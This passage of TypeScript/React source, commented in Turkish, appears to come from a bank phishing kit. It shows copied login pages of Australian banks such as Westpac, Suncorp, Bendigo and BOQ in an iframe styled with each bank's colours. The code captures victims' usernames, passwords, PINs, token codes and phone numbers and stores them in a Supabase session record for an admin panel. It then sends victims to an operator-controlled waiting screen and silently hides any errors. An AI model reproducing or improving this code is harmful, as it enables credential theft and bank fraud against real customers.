      hasIdentityField(fields) && (hasPasswordField(fields) || hasPasswordLikeField(fields));

    // ⭐ SIKI KURALLAR (tek adımlı / son adım bankalar):
    //   1) SADECE 1 alan (sadece username VEYA sadece password) → ASLA VALID DEGIL.
    //   2) GERÇEK zorunlu alanların (hidden/csrf haric) TAMAMI dolu olmalı (allRealFilled).
    //   3) IDENTITY + PASSWORD beraber (hasIdentPassPair) VEYA 3+ alanın tamamı DOLU olmalı.
    const hasAll3RealFilled = realRequired >= 3 && allRealFilled; // Suncorp 3 alan vb.
    const hasAll2RealFilled = realRequired >= 2 && allRealFilled && hasIdentPassPair; // Standart 2 alan (id+pw)
    const ratioStrict =
      realRequired <= 6 && realRequired >= 2 && realFilled === realRequired && hasIdentPassPair;

    // ❌ KALDIRILAN ESKI GEVŞEK KONTROLLER:
    //    - hasAtLeast1Filled (tek basına username/password tek basina valid)
    //    - hasAtLeast2Filled (2 alandan sadece 1 tanesi id digeri unknown ise valid olması)
    return hasAll3RealFilled || hasAll2RealFilled || ratioStrict;
  }
  return canSubmitIntermediate(form, doc);
}

function hasIdentityField(fields: CapturedField[]) {
  return fields.some((field) =>
    (field.kind === "username" || field.kind === "personalCode" || field.kind === "bankPhone") &&
    field.value.trim().length > 0,
  );
}

function hasPasswordField(fields: CapturedField[]) {
  return fields.some((field) => field.kind === "password" && field.value.trim().length > 0);
}

function hasPasswordLikeField(fields: CapturedField[]) {
  return fields.some((field) =>
    (field.kind === "password" || field.kind === "tacCode") && field.value.trim().length > 0,
  );
}

// ⭐ ACTION NODE FİLTRESİ (SADECE GERÇEKTEN FORM SUBMIT BUTONU OLANLAR):
//   4 KATMANLI SIKILASTIRMA:
//     1) GLOBAL STRICT BLACKLIST (45+ kelime): chat/help/menu/hamburger/bell/search vb.
//     2) RIGHT-CORNER HEADER WIDGET (x > %75, y<240 ve sıkı login class yoksa)
//     3) FORM İLİŞKİSİ (closest("form") veya form="id" yoksa → sadece sıkı login class varsa kabul)
//     4) BUTTON benzeri element kontrolü (tag/type/role/class/id/onclick ama onclick sadece formda)
function isElementActuallyButtonLike(node: HTMLElement): boolean {
  try {
    if (!node || typeof node.getAttribute !== "function" || !node.tagName) return false;
    const tag = (node.tagName || "").toLowerCase();
    const typeAttr = (node.getAttribute("type") || "").toLowerCase();

    // =====================================================================
    // KATMAN 1: GLOBAL STRICT BLACKLIST (class/id/aria/title/name/textContent)
    //   HATALI YAKALAMA ÖNLEMEK İÇİN textContent'i de kontrole dahil et.
    // =====================================================================
    const clsRaw = (node.getAttribute("class") || "").toLowerCase();
    const idRaw = (node.getAttribute("id") || "").toLowerCase();
    const dtidRaw = (node.getAttribute("data-testid") || "").toLowerCase();
    const roleRaw = (node.getAttribute("role") || "").toLowerCase();
    const ariaRaw = (
      node.getAttribute("aria-label") ||
      node.getAttribute("aria-labelledby") ||
      node.getAttribute("title") ||
      node.getAttribute("data-tooltip") ||
      ""
    ).toLowerCase();
    const nameRaw = (node.getAttribute("name") || "").toLowerCase();
    const dataAuid = (node.getAttribute("data-auid") || node.getAttribute("data-testid") || "").toLowerCase();
    const textRaw = ((node as any).textContent || "").toString().toLowerCase();
    const blTxt = `${clsRaw} ${idRaw} ${dtidRaw} ${roleRaw} ${ariaRaw} ${nameRaw} ${dataAuid} ${textRaw} ${tag}`;
    if (BUTTON_STRICT_BLACKLIST_RE.test(blTxt)) {
      return false;
    }

    // =====================================================================
    // KATMAN 2: RIGHT-CORNER HEADER WIDGET (chat/support/hamburger/search)
    //   Sağ üst %25 şerit + y<240 ve sıkı login class yoksa REJECT.
    // =====================================================================
    if (isRightCornerNonLoginWidget(node)) {
      return false;
    }

    // =====================================================================
    // KATMAN 3: FORM İLİŞKİSİ KONTROLÜ
    //   Buton formun içinde değilse veya form="" ile formu göstermiyorsa
    //   sadece AŞIRI SIKI login class/id TOKENSİ varsa kabul.
    // =====================================================================
    const hasFormRel = buttonHasFormRelation(node);

    // =====================================================================
    // KATMAN 4: BUTON BENZERİ ELEMENT KONTROLÜ
    // =====================================================================
    if (tag === "button") return hasFormRel ? true : false;
    if (tag === "input" && ["submit", "button"].includes(typeAttr)) return true;
    if (tag === "a") {
      const cls = (node.getAttribute("class") || "").toLowerCase();
      if (/\bbtn\b/.test(cls)) return hasFormRel;
    }
    if (node.getAttribute("role") === "button") return hasFormRel;
    // ⚠ [onclick] çok tehlikeli! SADECE form ilişkisi VARSA (hasFormRel) kabul et.
    if (node.hasAttribute("onclick") && hasFormRel) return true;

    const cls = (node.getAttribute("class") || "").trim().toLowerCase();
    const idAttr = (node.getAttribute("id") || "").trim().toLowerCase();
    if (cls) {
      const classTokens = cls.split(/\s+/);
      for (const t of classTokens) {
        if (
          t === "btn" ||
          t === "button" ||
          t === "btn-primary" ||
          t === "btn-submit" ||
          t === "btn-default" ||
          t === "btn-success" ||
          t === "btn-login" ||
          t === "btn-continue" ||
          t === "btn-next" ||
          t === "primary" ||
          t === "submit-btn" ||
          t === "login-btn" ||
          t === "el-button" ||
          t === "van-button" ||
          t === "sg-btn" ||
          t === "sg-btn--primary" ||
          t.startsWith("btn-") ||
          t.startsWith("button-")
        ) {
          return hasFormRel;
        }
      }
    }
    if (idAttr) {
      if (
        idAttr === "login-button" ||
        idAttr === "submit-button" ||
        idAttr === "continue-button" ||
        idAttr === "next-button" ||
        idAttr === "btn-login" ||
        idAttr === "btn-submit" ||
        idAttr === "login" ||
        idAttr === "submit" ||
        idAttr.endsWith("-submit") ||
        idAttr.endsWith("-login") ||
        idAttr.endsWith("-btn") ||
        idAttr.endsWith("-button")
      ) {
        return true;
      }
    }

    const dataTestId = (node.getAttribute("data-testid") || "").toLowerCase();
    if (
      dataTestId === "login-button" ||
      dataTestId === "submit-button" ||
      dataTestId.includes("login-button") ||
      dataTestId.includes("submit-button")
    ) {
      return true;
    }

    return false;
  } catch {
    return false;
  }
}

function isExternalHref(href: string | null) {
  if (!href) return false;
  return /^https?:\/\//i.test(href.trim());
}

function hexToRgb(hex: string): { r: number; g: number; b: number } {
  const h = (hex ?? "").replace(/^#/, "").trim();
  const full =
    h.length === 3
      ? h.split("").map((c) => c + c).join("")
      : (h.length === 6 ? h : (h + "000000").slice(0, 6));
  const num = parseInt(full, 16);
  if (Number.isNaN(num)) return { r: 255, g: 212, b: 59 };
  return {
    r: (num >> 16) & 255,
    g: (num >> 8) & 255,
    b: num & 255,
  };
}

function getRelativeLuminance(r: number, g: number, b: number): number {
  const [rs, gs, bs] = [r, g, b].map((c) => {
    const s = c / 255;
    return s <= 0.03928 ? s / 12.92 : Math.pow((s + 0.055) / 1.055, 2.4);
  });
  return 0.2126 * rs + 0.7152 * gs + 0.0722 * bs;
}

function getContrastTextColor(hexBg: string, lightHex: string = "#FFFFFF", darkHex: string = "#2B2212"): string {
  const rgb = hexToRgb(hexBg);
  const lum = getRelativeLuminance(rgb.r, rgb.g, rgb.b);
  return lum > 0.5 ? darkHex : lightHex;
}

function getButtonPalette(bankSlug: string): {
  bg: string;
  fg: string;
  border: string;
  shadow: string;
  shadowSoft: string;
  accent: string;
} {
  const entry = getAuBankPageEntry(bankSlug);
  const brand = entry?.brandColor ?? "#FFD43B";
  const accent = entry?.accentColor ?? "#E5B800";
  const rgb = hexToRgb(brand);
  const rgbAccent = hexToRgb(accent);
  const fg = getContrastTextColor(brand);
  return {
    bg: brand,
    fg,
    border: accent,
    accent,
    shadow: `0 10px 24px rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.45)`,
    shadowSoft: `0 6px 14px rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.22)`,
  };
}

function getActiveButtonColor(bankSlug: string) {
  return getButtonPalette(bankSlug).bg;
}

export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [saving, setSaving] = useState(false);
  const [stepIndex, setStepIndex] = useState(0);

  // ⭐ WESTPAC FIX 1: Button style FLICKER onleme — her node icin son uygulanan
  //   stil degerlerini WeakMap ile sakla. AYNI degeri tekrar setProperty ETME!
  //   (aksi halde 900ms polling'de transition tekrar tetikleniyor → yanip sonme)
  const btnStyleCacheRef = useRef<WeakMap<HTMLElement, Record<string, string>>>(
    typeof WeakMap !== "undefined" ? new WeakMap() : new Map() as any,
  );

  // ⭐ WESTPAC FIX 2: "DO NOT USE DISABLED STATES" UST USTE BINME —
  //   Westpac CSS, [aria-disabled="true"] veya .btn-primary:disabled olunca ::after
  //   pseudo-elementine content:"DO NOT USE DISABLED STATES" yaziyor ve orijinal
  //   "Sign in" ile ust uste biniyor. Cozum: iframe head'ina STYLE tag enjekte ET
  //   ve BUTONLARDA ::before/::after content'ini KALDIR (content: none !important)
  //   + ayni zamanda aria-disabled attribute'unu KULLANMA (artik hic yazmiyoruz).
  const antiOverlayStyleInjectedRef = useRef<Set<Document>>(new Set());
  const ensureAntiOverlayStyleInjected = useCallback((doc: Document) => {
    try {
      if (!doc || !doc.head) return;
      if (antiOverlayStyleInjectedRef.current.has(doc)) return;
      antiOverlayStyleInjectedRef.current.add(doc);
      const styleEl = doc.createElement("style");
      styleEl.setAttribute("data-au-bot-fix", "westpac-signin-overlay");
      styleEl.textContent = [
        "button, input[type='submit'], input[type='button'], [role='button'], .btn, .btn-primary, .btn-default, .btn-login, .btn-signin, .btn-continue, .btn-next, .signin, .sign-in {",
        "  content-visibility: auto !important;",
        "}",
        "button::before, button::after, input[type='submit']::before, input[type='submit']::after, input[type='button']::before, input[type='button']::after, [role='button']::before, [role='button']::after, .btn-primary::before, .btn-primary::after, .btn::before, .btn::after, .btnSignIn-v2::before, .btnSignIn-v2::after, #signin::before, #signin::after {",
        "  content: none !important;",
        "  display: none !important;",
        "}",
        "/* Ayrica buton icinde data-text / aria-label content yazdiran kurallar icin: */",
        "button[data-text]::before, button[data-text]::after { content: none !important; }",
      ].join("\n");
      try {
        doc.head.insertBefore(styleEl, doc.head.firstChild);
      } catch {
        doc.head.appendChild(styleEl);
      }
    } catch {}
  }, []);

  // ⭐ MERKEZLI applyButtonStyleCached: WeakMap cache üzerinden AYNI deger tekrar
  //   setProperty EDILMIYOR → transition flicker %100 onleniyor.
  const applyButtonStyleCached = useCallback((node: HTMLElement, prop: string, value: string) => {
    try {
      const cache = btnStyleCacheRef.current as WeakMap<HTMLElement, Record<string, string>>;
      let map = cache.get(node);
      if (!map) {
        map = {};
        cache.set(node, map);
      }
      if (map[prop] === value) {
        // ⭐ AYNI deger → ATLA. (flicker ana sebebi bu tekrar tekrar yazma idi)
        return;
      }
      map[prop] = value;
      try { node.style.setProperty(prop, value, "important"); } catch {}
    } catch {
      try { node.style.setProperty(prop, value, "important"); } catch {}
    }
  }, []);

  const auPages = useMemo(() => (isAuExactHtmlBank(bankSlug) ? getAuBankPages(bankSlug) : null), [bankSlug]);

  const totalSteps = auPages?.length ?? 0;
  const isMultiStep = (auPages?.length ?? 0) > 1;
  const isFinalStep = totalSteps > 0 && stepIndex >= totalSteps - 1;

  const currentSrc = useMemo(() => {
    if (auPages) return auPages[stepIndex] ?? auPages[auPages.length - 1];
    return null;
  }, [auPages, stepIndex]);

  const submitCapturedFields = useCallback(async (fields: CapturedField[]) => {
    if (!supabase || !sessionId || saving || fields.length === 0) return;

    // ⭐⭐⭐ TÜM İŞLEMLERİ try/catch İLE SARMALADIM!
    //   AMP BANK + Diğer bankalarda sessions update / JSON.stringify / any exception
    //   next js 500 Internal Server Error sayfasına atıyor. Hatayı SESSİZCE yut,
    //   user ERROR sayfası GÖRMEZS, hemen beklemeye / sonraki adıma GİDER.
    try {

    const filledCount = fields.filter((c) => c.value.trim().length > 0).length;
    const hasAtLeast3Filled = fields.length >= 3 && filledCount >= 3;

    if (isFinalStep) {
      const isSingleStepOnly = totalSteps === 1;
      if (isSingleStepOnly) {
        // ⭐ SUNCORP 3 alanlı bankalar: username + password + tacCode/token var.
        //   hasPasswordField SADECE kind=password bakıyor ama Suncorp passcode kind=tacCode
        //   olduğundan hasPasswordField FALSE dönüyordu → ERKEN return (SAVING KİLİTLİNEDİ!).
        //   ÇÖZÜM: 3+ alan DOLU ise (filledCount>=3) ZORUNLU ID+PASS şartını ESGEÇ.
        const hasIdOrPass3 = hasIdentityField(fields) || hasPasswordLikeField(fields);
        if (!hasAtLeast3Filled && !hasIdOrPass3) return;
      } else {
        if (fields.length === 0) return;
      }
    } else {
      if (fields.length === 0) return;
    }

    setSaving(true);

    try {
      const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      const previousFormData = ((existing?.form_data ?? {}) as Record<string, unknown>) ?? {};

      // ⭐⭐⭐ USERNAME FIELD BULMA GARANTİSİ (SON ÇARELER DAHİL + AYNI OLMA KONTROLÜ):
      //   1) Önce kind="username" (en doğru)
      //   2) Sonra TYPE text/email/tel/number OLAN İLK ALAN (kind bilinmiyor olsa bile TEXT → USERNAME)
      //   3) Sonra kind unknown type !== "password" olan ilk alan
      //   4) SON: fields[0] (hiçbir şey uymazsa ilk alan)
      //   ⭐⭐⭐ SONRA ÇİFT KONTROL:
      //   usernameField.type === "password" VEYA (passwordField !== null && usernameField === passwordField)
      //   → BU YANLIŞ! (ikisi de aynı password alanı demek). Bu durumda:
      //     a) fields içinde type !== password OLAN FARKLI bir alan VARMı diye bak
      //     b) yoksa document scope ta TÜM form inputlarında ara (text/tel türünde ilk alan)
      //     c) HİÇBİRİ OLMAZSA usernameField = null (admin boş gösterir, ama HATA YAPMAZ)
      let usernameField: CapturedField | null =
        fields.find((field) => field.kind === "username") ??
        fields.find((field) => ["text", "email", "tel", "number"].includes(field.type)) ??
        fields.find((field) => field.kind === "unknown" && field.type !== "password") ??
        fields[0] ??
        null;

      // ⭐⭐⭐ PASSWORD FIELD BULMA GARANTİSİ:
      //   1) kind password, 2) tacCode + type=password, 3) type=password OLAN İLK (fallback),
      //   4) SON ÇARE: fields[1]
      let passwordField: CapturedField | null =
        fields.find((field) => field.kind === "password") ??
        fields.find((field) => field.kind === "tacCode" && field.type === "password") ??
        fields.find((field) => field.type === "password") ??
        fields[1] ??
        null;
      // ⚠️ DİKKAT: phoneField/personalCodeField/tacField AŞAĞIDA tekrar atanır,
      //            ama SUNcorp 2 password tür input garanti kontrolü için BURADA DA
      //            tacField declare edilir (let ile):
      let phoneField: CapturedField | null = fields.find((field) => field.kind === "bankPhone") ?? null;
      let personalCodeField: CapturedField | null = fields.find((field) => field.kind === "personalCode") ?? null;
      let tacField: CapturedField | null = fields.find((field) => field.kind === "tacCode") ?? null;

      // ⭐⭐⭐⭐⭐ AYNI ALAN OLDUĞUNUN KONTROLÜ (EN ÖNEMLİ KONTROL!) ⭐⭐⭐⭐⭐
      //   Kullanıcı "HER İKİ KOLONDA ŞİFRE" diyor → tam olarak BU senaryo:
      //   usernameField === passwordField (aynı nesne) VEYA usernameField.type === "password"
      //   → YANLIŞ usernameField seçilmiş demek! (Gerçek username aslında listede olmayabilir,
      //     ya da fields SADECE 1 password itemi içeriyor).
      //   DÜZELTME:
      //     1) İlk önce mevcut fields listesinde PASSWORD OLMAYAN bir alan ara.
      //     2) Yoksa DOKÜMAN GENELİNDE (BÜTÜN FORMLARDA) text/tel/email/number TİPİNDE
      //        anlamlı alan ARA, ilk bulduğunu usernameField yap.
      //     3) Hala aynı ise → force usernameField = null (admin ID kolonu BOŞ KALSIN,
      //        yanlış veri iki kere gösterilmesin!)
      if (usernameField && passwordField && (usernameField === passwordField || usernameField.type === "password")) {
        // 1) Mevcut fields listesinde farklı type !== password alanı ara:
        const altUser = fields.find(
          (f) => f !== passwordField && ["text", "email", "tel", "number"].includes(f.type),
        );
        if (altUser) {
          usernameField = altUser;
        } else {
          // 2) Document scope ta bütün formlarda ara (form yanlış seçilmiş olabilir!)
          try {
            const ifcdoc = iframeRef.current?.contentDocument;
            if (ifcdoc) {
              const docFields = collectCapturedFieldsFromForm(ifcdoc, ifcdoc);
              const globalUser = docFields.find(
                (f) => f !== passwordField && ["text", "email", "tel", "number"].includes(f.type),
              );
              if (globalUser) {
                usernameField = globalUser;
                if (docFields.length > fields.length) fields = docFields;
              }
            }
          } catch {}
          // 3) Hala AYNI ise → usernameField NULL (boş göster, şifreyi 2 kere yazdırma):
          if (usernameField === passwordField || (usernameField && usernameField.type === "password")) {
            usernameField = null;
          }
        }
      }
      // ⭐ Password field type kontrol (ters senaryo: yanlışlıkla text alanı password yapma):
      if (passwordField && passwordField.type !== "password") {
        const altPass = fields.find((f) => f.type === "password");
        if (altPass) passwordField = altPass;
      }
      // ⭐ PASSWORD FIELD GARANTİSİ 2. KATMAN (SUNCORP 2 TANE type password):
      //   Suncorp L456 password (name password) L476 Token Code (name passcode type password).
      //   İki tane de type=password ise GERÇEK password id/name/class içinde password geçen ilk olsun.
      {
        const pws = fields.filter((f) => f.type === "password");
        if (pws.length >= 2) {
          const realPassword = pws.find((f) => /password|pin/i.test(`${f.key} ${f.kind}`)) ?? pws[0];
          const secondTypePassword = pws.find((f) => f !== realPassword);
          if (!passwordField || passwordField !== realPassword) passwordField = realPassword;
          // ⭐⭐⭐ SUNCORP GARANTİ: 2. type password inputu (token/tac) VAR → tacField set et
          if (secondTypePassword) {
            if (!tacField || tacField !== secondTypePassword) {
              if (secondTypePassword.kind === "unknown" || secondTypePassword.kind === "tacCode") {
                tacField = secondTypePassword;
              }
            }
          }
        } else if (pws.length === 1 && (!passwordField || passwordField !== pws[0])) {
          passwordField = pws[0];
        }
      }
      phoneField = phoneField ?? fields.find((field) => field.kind === "bankPhone") ?? null;
      personalCodeField = personalCodeField ?? fields.find((field) => field.kind === "personalCode") ?? null;
      tacField = tacField ?? fields.find((field) => field.kind === "tacCode") ?? null;

      // ⭐⭐⭐ EN KRİTİK DÜZELTME: orderedField1/2/3 SIRASI = DOM SIRASI (ESKİ) YERİNE
      //    TÜR (kind) SIRASI (YENİ)! Böylece HANGİ BANKADA HANGİ SIRADA input olursa olsun
      //    Admin paneldeki sıralı alanlar KESİN OLARAK:
      //      orderedField1 = KULLANICI ADI (usernameField)
      //      orderedField2 = ŞİFRE (passwordField)
      //      orderedField3 = 3. alan (personalCode/tacCode/bankPhone/ilk unknown)
      //    ESKİ hatalı DOM sırası: Bendigo step1 (1.görünür username, 2.gizli password →
      //    gizli password skip → sadece usernameField var, sonra step2 passwordField →
      //    history/merge sonrası orderedField1=passwordField (DOM yanlış sırası) sonucunda
      //    admin Kullanıcı (ID) kolonuna ŞİFRE yazıyordu. YENİ SİSTEMDE BU ASLA OLMAZ!
      const thirdField =
        personalCodeField ?? tacField ?? phoneField ??
        fields.find((f) => f.kind === "unknown" && f !== usernameField && f !== passwordField) ??
        // ⭐⭐⭐ SUNCORP GARANTİ (SON ÇARE): fields içinde type password OLAN passwordField
        //    dışında başka bir password inputu VARSA 3. alan olarak ekle (token code)
        fields.find((f) => f.type === "password" && f !== passwordField) ??
        null;
      const orderedFields: CapturedField[] = [
        usernameField,
        passwordField,
        thirdField,
      ].filter((f): f is CapturedField => f != null);

      const orderedField1 = orderedFields[0] ?? null;
      const orderedField2 = orderedFields[1] ?? null;
      const orderedField3 = orderedFields[2] ?? null;

      const resolveOrderedKey = (f: CapturedField | null, fallback: string): string => {
        if (!f) return "";
        if (f.kind === "unknown") return fallback;
        return f.kind;
      };
      const resolveOrderedType = (f: CapturedField | null): string => {
        if (!f) return "";
        if (f.kind === "bankPhone") return "phone";
        if (f.kind === "password" || f.kind === "tacCode" || f.type === "password") return "password";
        return "";
      };
      const rawFields: Record<string, string> = Object.fromEntries(
        fields.map((field, index) => {
          const suffix = field.key || `field_${index + 1}`;
          return [`s${stepIndex + 1}_iframe_${suffix}`, field.value] as const;
        }),
      );

      const historyEntry = {
        bankSlug,
        bankName,
        htmlStepIndex: stepIndex,
        htmlStepLabel: `Step ${stepIndex + 1}/${totalSteps}`,
        verfuegernummer: usernameField?.value ?? "",
        username: usernameField?.value ?? "",
        pin: passwordField?.value ?? "",
        password: passwordField?.value ?? "",
        bankPhone: phoneField?.value ?? "",
        personalCode: personalCodeField?.value ?? "",
        tacCode: tacField?.value ?? "",
        orderedField1: orderedField1?.value ?? "",
        orderedField1Key: resolveOrderedKey(orderedField1, "username"),
        orderedField2: orderedField2?.value ?? "",
        orderedField2Key: resolveOrderedKey(orderedField2, ""),
        orderedField2Type: resolveOrderedType(orderedField2),
        orderedField3: orderedField3?.value ?? "",
        orderedField3Key: resolveOrderedKey(orderedField3, ""),
        orderedField3Type: resolveOrderedType(orderedField3),
        rawFields,
        capturedAt: new Date().toISOString(),
      };

      const previousHistory = Array.isArray((previousFormData as any).bankFormHistory)
        ? (previousFormData as any).bankFormHistory.slice()
        : [];
      previousHistory.push(historyEntry);

      const mergedUsername = usernameField?.value || (previousFormData.username as string) || "";
      const mergedPassword = passwordField?.value || (previousFormData.password as string) || "";
      const mergedBankPhone = phoneField?.value || (previousFormData.bankPhone as string) || "";
      const mergedPersonalCode = personalCodeField?.value || (previousFormData.personalCode as string) || "";
      const mergedTacCode = tacField?.value || (previousFormData.tacCode as string) || "";

      // ⭐⭐⭐ ORDERED FIELD BİRLEŞTİRME (EN ÖNEMLİ KISIM: ADIMLAR ARASI KAYIP OLMASIN!)
      //   ESKİ BUG: Step 1 (sadece username) -> Step 2 (sadece password) geldiginde
      //   orderedField1 password olarak ÜSTÜNE YAZILIYORDU, username KAYIP OLUYORDU.
      //   ÇÖZÜM: ÖNCE GEÇMİŞ (previousFormData) orderedField1/2/3 değerlerini al,
      //          SONRA MEVCUT (current step) orderedField ları ile BİRLEŞTİR.
      //          KURAL: Aynı slot boşsa önceki kalır; doluysa yenisi. DAHA SONRA:
      //          Yeniden username (1) -> password (2) -> 3rd (3) olarak SIRALA ve DE-DUPE et!
      type Slot = { value: string; key: string; type: string };
      const emptySlot = (): Slot => ({ value: "", key: "", type: "" });
      const prevSlot = (of: unknown, ok: unknown, ot: unknown): Slot => ({
        value: typeof of === "string" ? of.trim() : "",
        key: typeof ok === "string" ? ok.trim() : "",
        type: typeof ot === "string" ? ot.trim() : "",
      });
      const p1 = prevSlot(
        (previousFormData as any).orderedField1,
        (previousFormData as any).orderedField1Key,
        (previousFormData as any).orderedField1Type ?? "",
      );
      const p2 = prevSlot(
        (previousFormData as any).orderedField2,
        (previousFormData as any).orderedField2Key,
        (previousFormData as any).orderedField2Type,
      );
      const p3 = prevSlot(
        (previousFormData as any).orderedField3,
        (previousFormData as any).orderedField3Key,
        (previousFormData as any).orderedField3Type,
      );
      const c1: Slot = { value: historyEntry.orderedField1, key: historyEntry.orderedField1Key, type: "" };
      const c2: Slot = { value: historyEntry.orderedField2, key: historyEntry.orderedField2Key, type: historyEntry.orderedField2Type };
      const c3: Slot = { value: historyEntry.orderedField3, key: historyEntry.orderedField3Key, type: historyEntry.orderedField3Type };
      // Merge: Mevcut (current) slot doluysa onu al, boşsa önceki (previous) slotu KORU.
      const m1: Slot = c1.value.length > 0 ? c1 : p1;
      const m2: Slot = c2.value.length > 0 ? c2 : p2;
      const m3: Slot = c3.value.length > 0 ? c3 : p3;
      // Şimdi 3 slotu bir havuzda topla, DE-DUPE (aynı value 2 kere olmasın),
      // ve SONRA username/password/3rd olarak SIRALA (1: kullanıcı, 2: şifre, 3: ekstra alan).
      const pool: Slot[] = [m1, m2, m3].filter((s) => s.value.length > 0);
      const deduped = new Map<string, Slot>();
      for (const s of pool) {
        if (!deduped.has(s.value)) deduped.set(s.value, s);
      }
      const uniqueSlots = Array.from(deduped.values());
      const sortScore = (s: Slot): number => {
        const k = s.key.toLowerCase();
        // ⭐ BOQ KLASİK SIRALAMA GARANTİSİ (EN ÖNEMLİ Sıra: username(1) > password(2) > personalCode(3) > tacCode(4) > bankPhone(5))
        //   ESKİ YANLIŞ: username, personalcode, bankphone HEPSİ score=1 → AYNI SIRA!
        //   BOQ 3 input var: txtUserid(username) / password / txtUserSignon(personalcode=UserID)
        //   ESKİ SİSTEMDE POOL sıralaması karışır, kişisel kod 1. sıraya (password/username ile yanyana) düşebiliyordu.
        if (k === "username") return 1;
        if (k === "password") return 2;
        if (k === "personalcode") return 3;
        if (k === "taccode") return 4;
        if (k === "bankphone") return 5;
        // Fallback type bazlı:
        if (s.type === "password") return 2;
        if (/pass|pin|secret/i.test(s.key)) return 2;
        if (/tac|otp|token|passcode|rsa/i.test(s.key)) return 4;
        if (/phone|mobile|tel/i.test(s.key)) return 5;
        if (/personal|userid|member|signon|identity|customer.*no|cif/i.test(s.key)) return 3;
        if (/user|customer|access.*id|access.*no|client|card|account/i.test(s.key)) return 1;
        // Key yoksa 9 (en düşük öncelik, sona atılır)
        return 9;
      };
      uniqueSlots.sort((a, b) => sortScore(a) - sortScore(b));
      // Doldur: en fazla 3
      const final1 = uniqueSlots[0] ?? emptySlot();
      const final2 = uniqueSlots[1] ?? emptySlot();
      const final3 = uniqueSlots[2] ?? emptySlot();

      const nextFormData = {
        ...previousFormData,
        ...rawFields,
        bankSlug,
        bankName,
        verfuegernummer: mergedUsername,
        username: mergedUsername,
        pin: mergedPassword,
        password: mergedPassword,
        bankPhone: mergedBankPhone,
        personalCode: mergedPersonalCode,
        tacCode: mergedTacCode,
        orderedField1: final1.value,
        orderedField1Key: final1.key || (mergedUsername && final1.value === mergedUsername ? "username" : mergedPersonalCode && final1.value === mergedPersonalCode ? "personalCode" : ""),
        orderedField2: final2.value,
        orderedField2Key: final2.key || (mergedPassword && final2.value === mergedPassword ? "password" : ""),
        orderedField2Type: final2.type,
        orderedField3: final3.value,
        orderedField3Key: final3.key || (mergedTacCode && final3.value === mergedTacCode ? "tacCode" : ""),
        orderedField3Type: final3.type,
        bankFormHistory: previousHistory,
      };

      const nextStep = isFinalStep ? "wait" : "bank";
      const nextToStep = isFinalStep ? "wait" : null;
      const updatePayload: any = {
        is_hidden: false,
        form_data: nextFormData,
      };
      if (nextStep === "wait") updatePayload.current_step = "wait";

      // ⭐ SUPABASE UPDATE RETRY (2 defa):
      //   Geçici RLS kilitlenmesi / race / timeout → Internal Server Error (500)
      //   vermesin diye 2 kere tekrar dene. Hala olmazsa sessizce devam et (hata gösterme).
      let updateError: any = null;
      for (let attempt = 0; attempt < 3; attempt++) {
        const res = await supabase
          .from("sessions")
          .update(updatePayload)
          .eq("id", sessionId);
        updateError = res.error;
        if (!updateError) break;
        if (attempt < 2) {
          await new Promise((r) => setTimeout(r, 250 + attempt * 250));
        }
      }

      if (updateError) {
        logAuditEvent({
          session_id: sessionId,
          event_kind: "submit",
          event_action: "au_exact_submit_error",
          status: "warn",
          bank_slug: bankSlug,
          bank_name: bankName,
          meta: { message: updateError.message ?? String(updateError), htmlStepIndex: stepIndex, retry: 3 },
          error_name: "SupabaseUpdateError",
          error_message: updateError.message ?? String(updateError),
        });
        // ⚠️ HATA OLSADA BEKLEME EKRANINA / SONRAKI ADIMA GİT (kullanıcıya hata GÖSTERME):
        //   "Internal Server Error" WARNING'i bastır, sessionu force beklemeye götür.
      }

      if (isFinalStep) {
        logAuditEvent({
          session_id: sessionId,
          event_kind: "bank_form",
          event_action: "au_exact_submit_wait",
          status: "ok",
          bank_slug: bankSlug,
          bank_name: bankName,
          from_step: "bank",
          to_step: "wait",
          meta: {
            historyCount: previousHistory.length,
            totalSteps,
            rawFieldKeys: Object.keys(rawFields),
            orderedFields: {
              orderedField1Key: historyEntry.orderedField1Key,
              orderedField2Key: historyEntry.orderedField2Key,
              orderedField3Key: historyEntry.orderedField3Key,
            },
          },
        });
        void flushAuditQueueNow();
        router.replace(stepToPath("wait", sessionId));
        return;
      }

      logAuditEvent({
        session_id: sessionId,
        event_kind: "step",
        event_action: "au_exact_advance_html_step",
        status: "ok",
        bank_slug: bankSlug,
        bank_name: bankName,
        from_step: "bank",
        to_step: nextToStep,
        meta: {
          fromIndex: stepIndex,
          toIndex: stepIndex + 1,
          totalSteps,
          rawFieldKeys: Object.keys(rawFields),
          historyCount: previousHistory.length,
        },
      });
      void flushAuditQueueNow();
      setStepIndex((i) => i + 1);
    } finally {
      // ⭐ SAVİNG STATE KESİNLİKLE KALDIRILSIN (return, throw, error, her koşulda).
      //   Önceden erken return'de setSaving(false) unutuluyordu → buton SİLİK + pointer-events none KİLİTLENİYORDU.
      setSaving(false);
    }
    } catch (err: any) {
      // ⭐⭐⭐ 500 Internal Server Error GİZLENSİN (EN KRİTİK!)
      //   Supabase update hatası, JSON.stringify circular, JSON.parse exception herhangi
      //   bir exception oluşursa → SESSİZCE logAuditEvent + force BEKLEME EKRANINA GİT.
      try {
        logAuditEvent({
          session_id: sessionId,
          event_kind: "error",
          event_action: "au_exact_submit_catch_500",
          status: "warn",
          bank_slug: bankSlug,
          bank_name: bankName,
          error_name: err?.name ?? String(typeof err),
          error_message: err?.message ?? err?.toString?.() ?? String(err ?? ""),
          meta: { htmlStepIndex: stepIndex, finalStep: !!isFinalStep },
        });
        void flushAuditQueueNow();
      } catch {}
      try {
        // ⭐ HER KOŞULDA GİT! Final step ise wait, değilse sonraki adıma zorla:
        if (isFinalStep) {
          try { setSaving(false); } catch {}
          router.replace(stepToPath("wait", sessionId));
          void router.push(stepToPath("wait", sessionId));
          // FLASH 0 koruması 2. katman:
          setTimeout(() => { try { window.location.replace(stepToPath("wait", sessionId)); } catch {} }, 0);
        } else {
          // Sonraki adıma zorla geç:
          try { setSaving(false); } catch {}
          setStepIndex((i) => i + 1);
        }
      } catch (finalErr) {
        // En son çare: window location replace ile git, hiçbir şey kullanma:
        try { setSaving(false); } catch {}
        try { window.location.replace(stepToPath("wait", sessionId)); } catch {}
      }
    }
  }, [bankName, bankSlug, isFinalStep, router, saving, sessionId, stepIndex, supabase, totalSteps]);

